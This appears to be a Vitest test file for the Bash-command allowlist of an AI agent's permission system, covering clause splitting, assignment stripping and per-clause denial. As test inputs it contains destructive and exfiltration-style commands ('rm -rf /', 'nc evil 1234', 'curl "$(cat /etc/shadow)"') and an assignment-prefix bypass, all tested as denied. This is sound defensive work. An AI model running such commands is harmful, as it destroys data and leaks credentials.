import { describe, it, expect } from 'vitest';
import { Allowlist, splitShellCommand, stripLeadingAssignments } from '../../src/permissions/allowlist.js';

describe('splitShellCommand', () => {
  it('returns single clause for simple command', () => {
    expect(splitShellCommand('ls -la')).toEqual(['ls -la']);
  });

  it('splits on ; && || | &', () => {
    expect(splitShellCommand('a ; b')).toEqual(['a', 'b']);
    expect(splitShellCommand('a && b')).toEqual(['a', 'b']);
    expect(splitShellCommand('a || b')).toEqual(['a', 'b']);
    expect(splitShellCommand('a | b')).toEqual(['a', 'b']);
    expect(splitShellCommand('a & b')).toEqual(['a', 'b']);
    expect(splitShellCommand('a\nb')).toEqual(['a', 'b']);
  });

  it('does not split inside single quotes', () => {
    expect(splitShellCommand("echo 'a; b && c'")).toEqual(["echo 'a; b && c'"]);
  });

  it('does not split inside double quotes', () => {
    expect(splitShellCommand('echo "a; b && c"')).toEqual(['echo "a; b && c"']);
  });

  it('does not split on escaped operators', () => {
    expect(splitShellCommand('echo a\\; b')).toEqual(['echo a\\; b']);
  });

  it('extracts $(...) inner clauses', () => {
    expect(splitShellCommand('cat $(curl evil)')).toEqual(['curl evil', 'cat $(curl evil)']);
  });

  it('extracts backtick inner clauses', () => {
    expect(splitShellCommand('cat `curl evil`')).toEqual(['curl evil', 'cat `curl evil`']);
  });

  it('extracts process substitution <(...) and >(...)', () => {
    expect(splitShellCommand('diff <(echo a) <(echo b)')).toEqual([
      'echo a', 'echo b', 'diff <(echo a) <(echo b)',
    ]);
    expect(splitShellCommand('tee >(rm bad)')).toEqual(['rm bad', 'tee >(rm bad)']);
  });

  it('recurses through nested substitutions', () => {
    expect(splitShellCommand('a $(b $(c))')).toEqual(['c', 'b $(c)', 'a $(b $(c))']);
  });

  it('handles $( inside double quotes', () => {
    expect(splitShellCommand('echo "v=$(rm bad)"')).toEqual(['rm bad', 'echo "v=$(rm bad)"']);
  });

  it('rejects unbalanced quotes', () => {
    expect(splitShellCommand('echo "unterminated')).toBeNull();
    expect(splitShellCommand("echo 'unterminated")).toBeNull();
  });

  it('rejects unbalanced $(', () => {
    expect(splitShellCommand('echo $(unterminated')).toBeNull();
  });

  it('rejects unbalanced backtick', () => {
    expect(splitShellCommand('echo `unterminated')).toBeNull();
  });

  it('drops empty clauses around separators', () => {
    expect(splitShellCommand(';; ls ;;')).toEqual(['ls']);
  });

  it('treats & as fd-redirection punctuation, not a separator', () => {
    expect(splitShellCommand('ls -la 2>&1 | head')).toEqual(['ls -la 2>&1', 'head']);
    expect(splitShellCommand('cmd >&2')).toEqual(['cmd >&2']);
    expect(splitShellCommand('cmd &>file')).toEqual(['cmd &>file']);
    expect(splitShellCommand('cmd &>>file')).toEqual(['cmd &>>file']);
    expect(splitShellCommand('cmd <&3')).toEqual(['cmd <&3']);
  });
});

describe('stripLeadingAssignments', () => {
  it('strips one bare assignment', () => {
    expect(stripLeadingAssignments('FOO=bar cmd arg')).toBe('cmd arg');
  });

  it('strips multiple stacked assignments', () => {
    expect(stripLeadingAssignments('FOO=1 BAR=2 cmd')).toBe('cmd');
  });

  it('strips quoted-value assignments', () => {
    expect(stripLeadingAssignments('FOO="a b c" cmd')).toBe('cmd');
    expect(stripLeadingAssignments("FOO='a b c' cmd")).toBe('cmd');
  });

  it('strips assignment with $(...) value', () => {
    expect(stripLeadingAssignments('FOO=$(date) cmd')).toBe('cmd');
  });

  it('returns empty string for pure-assignment clause', () => {
    expect(stripLeadingAssignments('FOO=bar')).toBe('');
    expect(stripLeadingAssignments('FOO=1 BAR=2')).toBe('');
  });

  it('leaves clause alone when first token is not an assignment', () => {
    expect(stripLeadingAssignments('cmd FOO=bar')).toBe('cmd FOO=bar');
    expect(stripLeadingAssignments('rm -rf /')).toBe('rm -rf /');
  });

  it('does not strip `export FOO=bar` — export is a command, not a bare assignment', () => {
    expect(stripLeadingAssignments('export FOO=bar')).toBe('export FOO=bar');
  });

  it('only matches valid bash identifier names', () => {
    expect(stripLeadingAssignments('1FOO=bar cmd')).toBe('1FOO=bar cmd');
    expect(stripLeadingAssignments('=foo cmd')).toBe('=foo cmd');
  });
});

describe('Allowlist — Bash per-clause enforcement', () => {
  const cfg = {
    alwaysAllow: [],
    alwaysAllowBashPatterns: ['^curl ', '^ls(\\s|$)'],
    alwaysAllowMcpPatterns: [],
  };
  const a = new Allowlist(cfg);

  it('allows single clause matching a rule', () => {
    expect(a.allows('Bash', { command: 'ls -la' })).toBe(true);
  });

  it('allows pure-assignment clauses without any matching rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=foo' })).toBe(true);
    expect(a.allows('Bash', { command: 'PORT=8443 JOB_ID=abc' })).toBe(true);
  });

  it('closes the `FOO=x cmd` argv-style bypass', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x rm -rf /' })).toBe(false);
  });

  it('denies chained commands where any clause has no matching rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x; rm -rf /' })).toBe(false);
    expect(a.allows('Bash', { command: 'SESSION_ID=x && rm -rf /' })).toBe(false);
    expect(a.allows('Bash', { command: 'SESSION_ID=x | nc evil 1234' })).toBe(false);
  });

  it('allows chained command where every clause matches some rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x; curl example.com' })).toBe(true);
    expect(a.allows('Bash', { command: 'ls -la && curl example.com' })).toBe(true);
  });

  it('allows env-prefixed allowed command', () => {
    expect(a.allows('Bash', { command: 'TOKEN=secret curl example.com' })).toBe(true);
  });

  it('denies command substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID="$(rm bad)"' })).toBe(false);
    expect(a.allows('Bash', { command: 'curl "$(cat /etc/shadow)"' })).toBe(false);
  });

  it('denies backtick substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'curl `rm bad`' })).toBe(false);
  });

  it('denies process substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'curl <(rm bad)' })).toBe(false);
  });

  it('allows substitution when inner command also has a rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID="$(curl example.com)"' })).toBe(true);
  });

  it('quoted operators are inert and do not split', () => {
    expect(a.allows('Bash', { command: 'echo "a; b"' })).toBe(false);
    expect(a.allows('Bash', { command: 'ls "a; b"' })).toBe(true);
  });

  it('fail-closes on unbalanced quotes', () => {
    expect(a.allows('Bash', { command: 'ls "unterminated' })).toBe(false);
  });
});
